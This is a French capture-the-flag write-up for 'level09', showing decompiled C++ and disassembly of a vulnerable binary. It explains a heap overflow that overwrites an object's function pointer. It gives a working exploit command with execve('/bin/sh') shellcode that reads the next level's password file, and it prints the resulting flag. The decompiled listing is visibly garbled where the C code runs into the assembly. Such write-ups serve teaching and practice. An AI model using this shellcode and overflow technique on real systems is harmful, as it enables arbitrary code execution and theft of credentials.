# Rapport CTF - [Level09]

### Observation :
En arrivant sur le level9 on trouve un exécutable nommé level9.\
Quand nous essayons de le lancer nous n'avons pas de retour. \
Regardons donc avec gdb ou un decompilateur.

### Explication de Code :
En lançant le binaire dans hex-ray ou ghidra nous obtenons :
```c++
//----- (080486F6) --------------------------------------------------------
void __cdecl N::N(N *this, int a2)
{
*(_DWORD *)this = off_8048848;
*((_DWORD *)this + 26) = a2;
}

//----- (0804870E) --------------------------------------------------------
void *__cdecl N::setAnnotation(N *this, char *s)
{
size_t v2; // eax

v2 = strlen(s);
return memcpy((char *)this + 4, s, v2);
}

//----- (080485F4) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
N *v3; // ebx
N *v4; // ebx
N *v6; // [esp+1Ch] [ebp-8h]

if ( argc :	push   %ebp
0x080485f5 :	mov    %esp,%ebp
0x080485f7 :	push   %ebx
0x080485f8 :	and    $0xfffffff0,%esp
0x080485fb :	sub    $0x20,%esp
0x080485fe :	cmpl   $0x1,0x8(%ebp)
0x08048602 :	jg     0x8048610 
0x08048604 :	movl   $0x1,(%esp)
0x0804860b :	call   0x80484f0 
0x08048610 :	movl   $0x6c,(%esp)
0x08048617 :	call   0x8048530 
0x0804861c :	mov    %eax,%ebx
0x0804861e :	movl   $0x5,0x4(%esp)
0x08048626 :	mov    %ebx,(%esp)
0x08048629 :	call   0x80486f6 
0x0804862e :	mov    %ebx,0x1c(%esp)
0x08048632 :	movl   $0x6c,(%esp)
0x08048639 :	call   0x8048530 
0x0804863e :	mov    %eax,%ebx
0x08048640 :	movl   $0x6,0x4(%esp)
0x08048648 :	mov    %ebx,(%esp)
0x0804864b :	call   0x80486f6 
0x08048650 :	mov    %ebx,0x18(%esp)
0x08048654 :	mov    0x1c(%esp),%eax
0x08048658 :	mov    %eax,0x14(%esp)
0x0804865c :	mov    0x18(%esp),%eax
0x08048660 :	mov    %eax,0x10(%esp)
0x08048664 :	mov    0xc(%ebp),%eax
0x08048667 :	add    $0x4,%eax
0x0804866a :	mov    (%eax),%eax
0x0804866c :	mov    %eax,0x4(%esp)
0x08048670 :	mov    0x14(%esp),%eax
0x08048674 :	mov    %eax,(%esp)
0x08048677 :	call   0x804870e 
0x0804867c :	mov    0x10(%esp),%eax
0x08048680 :	mov    (%eax),%eax
0x08048682 :	mov    (%eax),%edx
0x08048684 :	mov    0x14(%esp),%eax
0x08048688 :	mov    %eax,0x4(%esp)
0x0804868c :	mov    0x10(%esp),%eax
0x08048690 :	mov    %eax,(%esp)
0x08048693 :	call   *%edx
0x08048695 :	mov    -0x4(%ebp),%ebx
0x08048698 :	leave  
0x08048699 :	ret 
```
On peut voir à partir de la ligne 136 que eax vas être mov dans edx qui vas exécuter sa valeur dereferencer.


### Solution :
Il nous faut donc overflow notre malloc (new) de `108` octets pour mettre une valeur de retour avec l'adresse de notre arv[1]. \
On injecte donc notre code: 
- Notre adresse de `arv[1] + 4` pour le dereferancement
- Notre `SHELLCODE` (en locurance 24 caracteres)
- Des octets random jusqu'a atteindre `108` pour pouvoir overflow, donc `108 - 4 - 24`
- Et enfin l'adresse de notre arv[1] pour qu'il puisse la déréférencer et arriver sur notre shellcode.

On fait la commande suivante pour obtenir le flag :
```sh
/home/user/level9/level9 $(python -c "print('\x08\x04\xa0\x10'[::-1]  + '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'A'*(108 - 4 - 24) + '\x08\x04\xa0\x0c'[::-1])") <<< "cat /home/user/bonus0/.pass"
```

### Resultat :
```sh
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
